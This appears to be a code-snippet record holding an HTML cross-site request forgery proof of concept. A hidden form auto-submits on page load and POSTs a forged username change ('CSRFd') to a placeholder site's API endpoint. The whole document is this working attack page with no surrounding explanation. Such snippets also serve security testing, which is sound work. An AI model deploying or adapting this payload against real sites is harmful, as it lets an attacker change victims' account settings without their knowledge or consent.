---
id: a29b59dd-ac70-45d2-98be-f32ca0f57f30
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:55:55.442485+00:00'
updated_at: '2023-04-06T03:55:55.447995+00:00'
---

# Code Snippet a29b59dd

**Language**: HTML

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```


